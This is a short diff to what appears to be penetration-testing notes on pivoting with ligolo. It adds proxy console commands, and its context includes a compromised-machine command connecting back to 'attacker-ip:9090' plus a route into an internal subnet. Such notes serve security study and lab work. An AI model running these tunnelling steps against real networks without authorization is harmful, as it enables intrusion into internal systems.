@@ -56,6 +56,12 @@ Pivoting is a crucial technique in penetration testing that allows an attacker t
           ```
         - On attacker's machine: `./ligolo -reverse -listen :9090`
         - On compromised machine: `./ligolo -connect attacker-ip:9090`
+        - Type on proxy
+          ```bash
+          session
+          start
+          ifconfig
+          ```
         - Configure Internal IP with proper IP (Replace given IP with targets internal ip)
            ```bash
            ip route add 192.168.148.0/24 dev ligolo
